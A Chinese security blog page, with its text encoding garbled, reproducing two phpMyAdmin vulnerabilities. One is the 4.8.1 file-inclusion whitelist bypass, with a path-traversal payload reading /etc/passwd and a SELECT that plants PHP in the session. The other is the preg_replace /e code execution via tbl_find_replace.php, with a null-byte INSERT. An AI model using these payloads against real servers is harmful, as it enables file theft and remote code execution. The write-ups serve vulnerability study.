        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
<p>ç™»é™†è´¦å·</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç¯å¢ƒ:phpstudy 2018,windows 10</p>
<p>æ¼æ´ä½ç½®:<code>index.php</code>:57</p>
<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
) {
    include $_REQUEST[&#39;target&#39;];
    exit;
}</code></pre>
<p>éå¸¸æ˜æ˜¾çš„ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>å‰é¢å‡ ä¸ªæ¡ä»¶éƒ½å¾ˆå¥½æ»¡è¶³,æˆ‘ä»¬çœ‹ä¸‹æœ€åä¸€ä¸ª<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
<p>è·Ÿè¿›å»</p>
<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }</code></pre>
<p>è¦è¿”å›<code>true</code>çš„è¯,éœ€è¦<code>$page</code>ä»å¼€å¤´åˆ°ç¬¬ä¸€ä¸ª<code>?</code>ä¹‹é—´çš„å­—ç¬¦ä¸²åœ¨ç™½åå•ä¸­,æœ‰ä»¥ä¸‹ç™½åå•</p>
<pre><code class="php">array (
  0 =&gt; &#39;db_datadict.php&#39;,
....
)</code></pre>
<p>å› ä¸ºå¤ç°ç¯å¢ƒæ˜¯åœ¨windowsä¸‹,windowsæ–‡ä»¶åä¸èƒ½åŒ…å«<code>?</code>,æ‰€ä»¥<code>db_datadict.php?</code>ä¼šå˜ä¸º<code>db_datadict.php</code>æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶,æˆ‘ä»¬ä¾¿æ— æ³•ç”¨<code>../</code>æ¥ç©¿æ¢­ç›®å½•äº†,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>$_page = urldecode($page);</code></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ <code>db_datadict.php%253f</code>æ¥ç»•è¿‡</p>
<p>é€šç”¨çš„payload:</p>
<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p>
<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://www.ccreater.top/1970/01/01/phpmyadmin">https://www.ccreater.top/1970/01/01/phpmyadmin</a> 4.8.1 rce/](<a href="https://www.ccreater.top/1970/01/01/phpmyadmin">https://www.ccreater.top/1970/01/01/phpmyadmin</a> 4.8.1 rce/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/phpmyadmin%204.8.1%20rce/" data-id="ckmn5757c006ns1nigh9xg0xw" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpmyadmin_ç™»é™†å_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_ç™»é™†å_rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadminç™»é™†årce"><a href="#phpmyadminç™»é™†årce" class="headerlink" title="phpmyadminç™»é™†årce"></a>phpmyadminç™»é™†årce</h1><h2 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h2><blockquote>
<p>åœ¨PHP5.4.7ä»¥å‰ï¼Œ<code>preg_replace</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨\0è¿›è¡Œæˆªæ–­ï¼Œå¹¶å°†æ­£åˆ™æ¨¡å¼ä¿®æ”¹ä¸ºeã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œeæ¨¡å¼çš„æ­£åˆ™æ”¯æŒæ‰§è¡Œä»£ç ï¼Œæ­¤æ—¶å°†å¯æ„é€ ä¸€ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>ä»¥ä¸‹ç‰ˆæœ¬å—åˆ°å½±å“ï¼š</p>
<ul>
<li>4.0.10.16ä¹‹å‰4.0.xç‰ˆæœ¬</li>
<li>4.4.15.7ä¹‹å‰4.4.xç‰ˆæœ¬</li>
<li>4.6.3ä¹‹å‰4.6.xç‰ˆæœ¬ï¼ˆå®é™…ä¸Šç”±äºè¯¥ç‰ˆæœ¬è¦æ±‚PHP5.5+ï¼Œæ‰€ä»¥æ— æ³•å¤ç°æœ¬æ¼æ´ï¼‰</li>
</ul>
</blockquote>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å…¨å±€æœç´¢preg_replace,å‘ç°ä»¥ä¸‹å¯èƒ½æœ‰å¯æ§å˜é‡çš„ä½ç½®:</p>
<p>å®¹æ˜“æ‰¾åˆ°</p>
<p><code>TableSearch.lib.php</code></p>
<pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this-&gt;_columnNames[$columnIndex];
        $sql_query = &quot;SELECT &quot;
            . PMA_Util::backquote($column) . &quot;,&quot;
            . &quot; 1,&quot; // to add an extra column that will have replaced value
            . &quot; COUNT(*)&quot;
            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)
            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)
            . &quot; WHERE &quot; . PMA_Util::backquote($column)
            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;
            . $charSet . &quot;_bin&quot;; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)
            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;

        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=&gt;$row) {
                $result[$index][1] = preg_replace(
                    &quot;/&quot; . $find . &quot;/&quot;,
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }</code></pre>
<p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$resultå’Œ$replaceWith</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
<p>æˆ‘ä»¬å…ˆçœ‹<code>getReplacePreview</code></p>
<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
<p>å†æŸ¥çœ‹è°ƒç”¨<code>getReplacePreview</code>çš„å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
<p>å»çœ‹ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜æ˜¾ä¸è¡Œ,è¿™é‡Œå°±ä¸è´´å‡ºæ¥äº†</p>
<p>å†è·Ÿè¿›<code>tbl_find_replace.php</code></p>
<pre><code class="php">if (isset($_POST[&#39;find&#39;])) {
    $preview = $table_search-&gt;getReplacePreview(
        $_POST[&#39;columnIndex&#39;],
        $_POST[&#39;find&#39;],
        $_POST[&#39;replaceWith&#39;],
        $_POST[&#39;useRegex&#39;],
        $connectionCharSet
    );
    $response-&gt;addJSON(&#39;preview&#39;, $preview);
    exit;
}</code></pre>
<p>æ˜æ˜¾ç™½ç»™</p>
<p>æˆ‘ä»¬å†å›åˆ°<code>_getRegexReplaceRows</code>å»æŸ¥çœ‹å®ƒçš„ç¬¬äºŒä¸ªè°ƒç”¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
<p>å†æŸ¥çœ‹è°ƒç”¨replaceçš„å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
<p>åŒæ ·åé¢ä¸¤ä¸ªè¿˜æ˜¯ä¸è¡Œ</p>
<p>åœ¨è·Ÿè¿›<code>tbl_find_replace.php</code></p>
<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
<p>è¿˜æ˜¯ç™½ç»™,ä¸¤ä¸ªè°ƒç”¨é“¾éƒ½æ˜¯å¯ä»¥rceçš„,æˆ‘ä»¬ä»¥å‰é¢é‚£ä¸ªä¸ºä¾‹</p>
<p>å…ˆå¾€è¡¨ä¸­æ·»åŠ ä¸€æ¡æ•°æ®<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
<p>ç›´æ¥æŠ“åŒ…,ä¿®æ”¹</p>
<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
<p>æˆåŠŸ</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>è¿™ä¸ªpocç›´æ¥æŠ„ä¸ªåˆ«äººçš„,æ‡’å¾—å†™äº†</p>
<p><code>https://www.exploit-db.com/exploits/40185</code></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/phpmyadmin_ç™»é™†å_rce/">https://www.ccreater.top/1970/01/01/phpmyadmin_ç™»é™†å_rce/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="ckmn5757d006qs1nibz1u011s" data-title="phpmyadmin_ç™»é™†å_rce" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">æ‚</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">å†…ç½‘æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">å‡ºé¢˜ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">åŸŸæ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">å¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">å­¦ä¹ ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">å°å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">æ‚</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">æ¯”èµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">æ¼æ´æŒ–æ˜</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">çº¿ä¸Šèµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">ç¼–ç¨‹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">è®°å½•</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cveå¤ç°</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">å†…ç½‘æ¸—é€</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å‡ºé¢˜ç¬”è®°</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">åŸŸæ¸—é€</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">å¤ç°</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å­¦ä¹ ç¬”è®°</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">å°å·¥å…·</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">å·¥å…·</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">æ‚</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">æ¯”èµ›</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">æ¸—é€</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">æ¼æ´æŒ–æ˜</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">çº¿ä¸Šèµ›</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">ç¼–ç¨‹</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">è®°å½•</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">é¶åœº</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</a>
          </li>
        
          <li>
            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn åä¸œå— web</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web éƒ¨åˆ†é¢˜è§£</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xmanä¸ªäººæ’ä½èµ›wp</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>